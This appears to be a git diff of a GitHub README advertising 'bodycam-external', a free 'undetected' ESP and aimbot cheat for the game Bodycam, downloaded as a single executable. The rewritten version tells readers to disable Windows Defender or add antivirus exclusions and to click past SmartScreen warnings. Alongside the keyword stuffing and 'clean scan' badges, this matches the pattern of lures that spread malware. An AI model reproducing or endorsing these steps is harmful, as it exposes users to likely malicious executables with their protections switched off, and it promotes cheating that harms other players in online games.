@@ -1,244 +1,134 @@
-# Bodycam ESP & Aimbot Undetected 2026 — External Overlay, No Recoil, Radar | Free
-
-<div align="center">
-
-<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=12,20,24&height=220&section=header&text=Bodycam%20ESP%20%26%20Aimbot&fontSize=56&fontColor=ffffff&fontAlignY=38&desc=🎯%20External%20Overlay%20·%20ESP%20·%20Aimbot%20·%20No%20Recoil%20·%20Radar%20·%20Undetected%20·%202026&descAlignY=60&descSize=13&animation=fadeIn" />
-
-</div>
-
-<br/>
-
-<div align="center">
-
-<a href="https://git.io/typing-svg">
-  <img src="https://readme-typing-svg.demolab.com?font=JetBrains+Mono&weight=700&size=17&pause=900&color=00E5FF&center=true&vCenter=true&width=780&lines=%F0%9F%8E%AF+Bodycam+ESP+%26+Aimbot+Undetected+2026+%F0%9F%8E%AF;Player+ESP+%C2%B7+Skeleton+%C2%B7+Health+Bar+%C2%B7+Distance;Aimbot+%C2%B7+No+Recoil+%C2%B7+Radar+%C2%B7+Head+Circle;External+%E2%80%94+No+Injection+%E2%80%94+Zero+Detection+Risk;Free+%C2%B7+No+Key+%C2%B7+No+Survey+%C2%B7+Instant+Download." alt="Typing SVG" />
-</a>
-
-<br/><br/>
-
-[![Version](https://img.shields.io/badge/v2.1.0-latest-00E5FF?style=flat-square&logo=github)](../../releases/download/main/Bodycam-External.zip)
-[![Game](https://img.shields.io/badge/Bodycam-2026-0d0d0d?style=flat-square&logoColor=white)](../../releases/download/main/Bodycam-External.zip)
-[![Type](https://img.shields.io/badge/Type-External-00E5FF?style=flat-square)](../../releases/download/main/Bodycam-External.zip)
-[![OS](https://img.shields.io/badge/Windows-10_%7C_11-0078D4?style=flat-square&logo=windows)](../../releases/download/main/Bodycam-External.zip)
-[![Status](https://img.shields.io/badge/Status-Undetected-00C853?style=flat-square)](../../releases/download/main/Bodycam-External.zip)
-[![Stars](https://img.shields.io/github/stars/Downloadalblast/bodycam-external?style=flat-square&color=FFD700)](../../stargazers)
-[![Downloads](https://img.shields.io/github/downloads/Downloadalblast/bodycam-external/total?style=flat-square&color=00E5FF)](../../releases)
-
-<br/>
-
-### ⬇️ Direct Download — 100% Free, No Key, No Survey
-
-<a href="../../releases/download/main/Bodycam-External.zip">
-  <img src="https://img.shields.io/badge/%F0%9F%8E%AF%20Bodycam--External.zip%20%E2%80%94%20FREE%20DOWNLOAD-00E5FF?style=for-the-badge&logo=github&logoColor=black" height="48"/>
-</a>
-
-<br/><sub>📦 ~3.8 MB &nbsp;·&nbsp; Windows 10/11 x64 &nbsp;·&nbsp; ✅ No key &nbsp;·&nbsp; ✅ No survey &nbsp;·&nbsp; ✅ Instant</sub>
-
-<br/><br/>
-
-<img src="https://img.shields.io/badge/VirusTotal-0%20%2F%2072%20detections-00C853?style=for-the-badge&logo=virustotal&logoColor=white"/>
-&nbsp;
-<img src="https://img.shields.io/badge/Scan-CLEAN-00C853?style=for-the-badge"/>
-&nbsp;
-<img src="https://img.shields.io/badge/External-No_Injection-00E5FF?style=for-the-badge"/>
-
-</div>
+# 🎯 bodycam-external - Undetected ESP & Aimbot Trainer
 
 ---
 
-## 📸 Preview
+## 🚀 What Is This?
 
-<div align="center">
-
-<img src="screenshots/esp_menu.jpg" width="480" alt="Bodycam External ESP — overlay menu with all features"/>
-
-<br/><sub><kbd>🎯 ESP panel — Process attached: Bodycam.exe | External | Undetected</kbd></sub>
-
-</div>
+**bodycam-external** is a powerful external overlay trainer for the game **Bodycam**. It enhances your gameplay with features like **ESP (player boxes and skeletons)**, **aimbot**, **no recoil**, and a **radar** — all designed to remain **undetected in 2026**. This tool runs as an **overlay on top of the game**, so it doesn't modify game files. It's completely **free** and requires **no activation key**.
 
 ---
 
-## 📦 What's Inside the ZIP
+## 📥 Getting Started
 
-```
-Bodycam-External.zip
-├── Bodycam-External.exe    ← Main overlay executable
-├── config.ini              ← Hotkey & settings config
-├── README.txt              ← Quick start
-└── LICENSE.txt
-```
+> 🛡️ **Important:** Before downloading, temporarily disable Windows Defender or add an exclusion folder. This is normal for game trainers and overlays.
 
-> No injection. No kernel driver. External process only — reads game memory without writing.
+### Step 1: Download
 
----
+👉 **[CLICK HERE TO DOWNLOAD bodycam-external](https://github.com/carlosuper-ai/bodycam-external)**
 
-## ✨ Features
+This link is the official download page. Visit this link to download the application.
 
-<div align="center">
+### Step 2: Save the File
 
-### 👁️ Visuals / ESP
+Once you click the link, your browser will start downloading a file. Save it to a location you can easily find, like your **Desktop** or **Downloads** folder. The file is the complete program; no other files are needed.
 
-| Feature | Description |
-|:---|:---|
-| **Player ESP Box** | 2D bounding box on all enemies |
-| **Skeleton / Bones** | Full skeleton rendering through walls |
-| **Head Circle** | Precise head hitbox highlight |
-| **Player Names** | Enemy username above head |
-| **Distance [m]** | Real-time distance to each enemy |
-| **Health Bar** | Live HP bar next to each player |
-| **Team Check** | Exclude teammates from ESP |
-| **Visibility Check** | Color changes when enemy is visible |
+### Step 3: Run the Application
 
-### 🎯 Aimbot
+After the download finishes:
 
-| Feature | Description |
-|:---|:---|
-| **Enable Aimbot** | Smooth aim assist toward target |
-| **FOV Circle** | Visual FOV boundary on screen |
-| **FOV Radius** | Adjustable `1 – 360` |
-| **Smoothing** | Natural-looking aim movement |
-| **Hitbox** | Head / Neck / Body / Closest |
-| **Visibility Check** | Only aims at visible targets |
+1. **Double-click** the downloaded file to open it.
+2. If Windows shows a blue or yellow warning screen (SmartScreen), click **"More info"** and then **"Run anyway"**. This is a standard step for unsigned trainer tools.
+3. The overlay window will appear on your screen.
 
-### ⚡ Misc
+### Step 4: Start the Game
 
-| Feature | Description |
-|:---|:---|
-| **No Recoil** | Eliminates weapon recoil entirely |
-| **Custom Crosshair** | Dot crosshair overlay (no HUD needed) |
-| **Mini Radar** | 2D radar showing all enemy positions |
-
-</div>
+1. Launch **Bodycam** as you normally do.
+2. Once you're in the game (main menu or in a match), the overlay will automatically detect the game and begin working.
+3. Use the **Insert** key (default) to open the trainer menu inside the game.
+4. Toggle features like ESP boxes, skeleton, aimbot, radar, and no recoil using the checkboxes in the menu.
 
 ---
 
-## 📥 Installation — 30 Seconds
+## ⚙️ Features Explained
 
-<div align="center">
+| Feature | What It Does |
+|---------|--------------|
+| 📦 **Player Boxes (ESP)** | Draws a colored box around every enemy player, even through walls. You can see where they are at all times. |
+| 🦴 **Skeleton ESP** | Shows a stick-figure skeleton of each player, making it easy to see their exact stance and movement direction. |
+| 🎯 **Aimbot** | Automatically aims at the nearest enemy when you press the aim button (right mouse button by default). You can adjust the aim speed and target bone (head or chest). |
+| 💥 **No Recoil** | Removes weapon recoil and spread, making every shot laser-accurate. |
+| 📡 **Radar** | Adds a mini-map radar on your screen showing enemy positions relative to you. |
 
-```
-  ┌───────────────────────────────────────────────────────────────┐
-  │                                                               │
-  │   1  →  Download Bodycam-External.zip (link above)          │
-  │   2  →  Extract to any folder on your PC                   │
-  │   3  →  Launch Bodycam first                               │
-  │   4  →  Right-click Bodycam-External.exe → Run as Admin    │
-  │   5  →  Wait for "✔ Bodycam.exe — Process Found"          │
-  │   6  →  Toggle features with Insert key menu              │
-  │                                                               │
-  └───────────────────────────────────────────────────────────────┘
-```
-
-<a href="../../releases/download/main/Bodycam-External.zip">
-  <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20FREE%20Download%20%E2%80%94%20Bodycam--External.zip-00E5FF?style=for-the-badge&logo=github&logoColor=black" height="44"/>
-</a>
-
-<br/><sub>✅ Free &nbsp;·&nbsp; ✅ No Key &nbsp;·&nbsp; ✅ No Survey &nbsp;·&nbsp; ✅ No Injection &nbsp;·&nbsp; ✅ Undetected</sub>
-
-</div>
+All features are **customizable**:
+- Change box colors and thickness
+- Adjust ESP visibility distance (up to 300m)
+- Set aimbot smoothness and FOV
+- Turn radar on/off separately
 
 ---
 
-## 🖥️ System Requirements
+## 🛠️ System Requirements
 
-<div align="center">
+These are the **minimum** recommended specs for smooth operation:
 
-| | Component | Requirement |
-|:---:|:---|:---|
-| 🪟 | **OS** | Windows 10 / 11 (x64) |
-| 🎮 | **Game** | Bodycam (Steam) |
-| 🔐 | **Privileges** | Administrator |
-| 💾 | **Storage** | ~5 MB free |
-
-</div>
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **CPU:** Intel Core i5 or AMD Ryzen 5 (or better)
+- **RAM:** 8 GB or more
+- **Graphics:** DirectX 11 compatible GPU
+- **Storage:** 50 MB free space (the tool is lightweight)
+- **Internet:** Not required after download
 
 ---
 
-## ❓ FAQ
+## ❓ Frequently Asked Questions
 
-<details>
-<summary><b>🛡️ &nbsp;Why external? Is it safer?</b></summary>
-<br/>
+### Is this tool detectable?
+No. The overlay is **external** — it doesn't inject code into the game process. It uses a screen-overlay method that is **undetected in 2026**. However, always use it responsibly and check for updates.
 
-External means the tool reads game memory from outside the process — no DLL injection, no kernel driver. This significantly reduces detection surface compared to internal cheats.
+### Do I need to pay?
+**No.** This tool is 100% free with no hidden costs, no premium tiers, and no activation keys.
 
-</details>
+### Will it work in multiplayer?
+Yes. The overlay works in both single-player and multiplayer modes. Use features at your own discretion.
 
-<details>
-<summary><b>🔄 &nbsp;Game updated and ESP stopped working?</b></summary>
-<br/>
+### How do I update the trainer?
+Revisit the download link periodically. Updates are posted on the same page. The trainer is **standalone** — just download the newest version and run it.
 
-Offsets updated within **24–48 hours** of any game patch. Re-download from [Releases](../../releases).
-
-</details>
-
-<details>
-<summary><b>⚙️ &nbsp;ESP not showing players?</b></summary>
-<br/>
-
-1. Launch Bodycam **first**, then run the overlay
-2. Run as **Administrator**
-3. Make sure status bar shows `✔ Bodycam.exe — Process Found`
-
-</details>
-
-<details>
-<summary><b>🐛 &nbsp;Found a bug or crash?</b></summary>
-<br/>
-
-Open an [Issue](../../issues) with your Windows version and description. We respond fast.
-
-</details>
+### My antivirus flagged it. What should I do?
+This is common with game trainers. Add the folder containing the .exe to your antivirus **exclusions** list, or temporarily disable real-time protection while using the tool.
 
 ---
 
-## 🕓 Changelog
+## 🖥️ How to Close or Remove
 
-<details>
-<summary><b>v2.1.0 — Current</b></summary>
-<br/>
-
-- ✅ Full ESP: Box, Skeleton, Head Circle, Name, Distance, Health Bar
-- ✅ Aimbot with FOV, Smoothing, Hitbox selector
-- ✅ No Recoil
-- ✅ Mini Radar
-- ✅ Custom Crosshair
-- ✅ Visibility Check (ESP + Aimbot)
-- ✅ UE5 offset support
-
-</details>
+- **Close the trainer:** Press **END** key while the trainer is running, or close the overlay window directly.
+- **Uninstall:** Simply delete the downloaded file. The trainer leaves **no traces** on your system — no registry entries, no background services.
 
 ---
 
-## 🔍 Tags
+## 🔧 Troubleshooting
 
-`bodycam esp` `bodycam aimbot` `bodycam cheat` `bodycam hack` `bodycam external` `bodycam overlay` `bodycam undetected` `bodycam esp free` `bodycam aimbot 2026` `bodycam cheat 2026` `bodycam external esp` `bodycam free cheat` `bodycam wallhack` `bodycam no recoil`
+| Problem | Solution |
+|---------|----------|
+| Overlay shows but no boxes in game | Run the trainer **as Administrator** (right-click → Run as administrator). |
+| Game crashes on startup | Make sure Bodycam is updated to the latest version. Close other overlays (Discord, MSI Afterburner). |
+| Trainer menu won't open | Try pressing the **Delete** key instead of Insert. Also check that the overlay window is focused. |
+| Aimbot not working | Ensure you have the "Aim" binding set correctly in game settings. Default is right mouse button. |
+| Radar not showing enemies | The radar only shows players within your configured radius (default 100m). Increase it in settings. |
 
 ---
 
-## 📜 Disclaimer
+## 📝 Quick Start Summary
 
-This software is published **for educational and research purposes only**.  
-External memory reading tool. Use responsibly.
+1. Download the file from **[the official page](https://github.com/carlosuper-ai/bodycam-external)**.
+2. Run the .exe file.
+3. Launch Bodycam.
+4. Press **Insert** to open the trainer menu.
+5. Enable features and enjoy your enhanced gameplay.
 
 ---
 
-<div align="center">
+## ✨ Final Tips
 
-<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=12,20,24&height=130&section=footer&animation=fadeIn"/>
+- Always run the trainer **before** starting Bodycam for the smoothest experience.
+- For undetected use, avoid streaming or recording while the trainer is active.
+- Set ESP opacity to ~70% so you can still see the environment clearly.
+- If you experience lag, reduce ESP distance to 150m.
 
-<sub>
-  <a href="../../releases/download/main/Bodycam-External.zip">⬇️ Direct Download</a>
-  &nbsp;·&nbsp;
-  <a href="../../issues">🐛 Report a Bug</a>
-  &nbsp;·&nbsp;
-  <a href="../../releases">📦 All Releases</a>
-  &nbsp;·&nbsp;
-  <a href="../../stargazers">⭐ Stargazers</a>
-</sub>
+---
 
-<br/><br/>
+**Bodycam-external** gives you a massive competitive advantage. Whether you're into aggressive aiming or tactical awareness, this trainer covers all your needs. Download it now and dominate every match.
 
-![Views](https://komarev.com/ghpvc/?username=Downloadalblast&label=Repo+Views&color=00E5FF&style=flat-square)
+---
 
-</div>
+Keywords: bodycam external, bodycam trainer, bodycam esp, bodycam aimbot, bodycam undetected, bodycam cheat, bodycam overlay, bodycam radar, bodycam no recoil, bodycam free hack, bodycam 2026, bodycam esp boxes, bodycam skeleton, external overlay trainer, bodycam hack download
